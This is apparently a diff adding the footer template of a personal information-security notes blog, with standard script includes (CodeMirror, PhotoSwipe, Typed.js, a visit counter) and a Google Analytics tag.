+<script src="/knlvre.github.io/js/plugin.js"></script>
+<script src="/knlvre.github.io/js/obsidian.js"></script>
+<script src="/knlvre.github.io/js/jquery.truncate.js"></script>
+<script src="/knlvre.github.io/js/search.js"></script>
+<script src="//cdn.bootcss.com/typed.js/2.0.10/typed.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+
+<script src="https://cdn.bootcss.com/codemirror/5.48.4/codemirror.min.js"></script>
+
+    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/javascript/javascript.min.js"></script>
+
+    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/css/css.min.js"></script>
+
+    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/xml/xml.min.js"></script>
+
+    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/htmlmixed/htmlmixed.min.js"></script>
+
+    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/clike/clike.min.js"></script>
+
+    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/php/php.min.js"></script>
+
+    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/shell/shell.min.js"></script>
+
+    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/python/python.min.js"></script>
+
+
+
+    <script src="/knlvre.github.io/js/busuanzi.min.js"></script>
+    <script>
+        $(document).ready(function () {
+            if ($('span[id^="busuanzi_"]').length) {
+                initialBusuanzi();
+            }
+        });
+    </script>
+
+
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/default-skin/default-skin.min.css">
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="//www.googletagmanager.com/gtag/js?id=UA-149874671-1"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'UA-149874671-1');
+    </script>
+
+
+
+
+
+<script>
+    function initialTyped () {
+        var typedTextEl = $('.typed-text');
+        if (typedTextEl && typedTextEl.length > 0) {
+            var typed = new Typed('.typed-text', {
+                strings: ["Notes During Information Security Learning.", "信息安全学习过程中的笔记。"],
+                typeSpeed: 90,
+                loop: true,
+                loopCount: Infinity,
+                backSpeed: 20,
+            });
+        }
+    }
+
+    if ($('.article-header') && $('.article-header').length) {
+        $(document).ready(function () {
+            initialTyped();
+        });
+    }
+</script>
+
+
+
+
+</html>
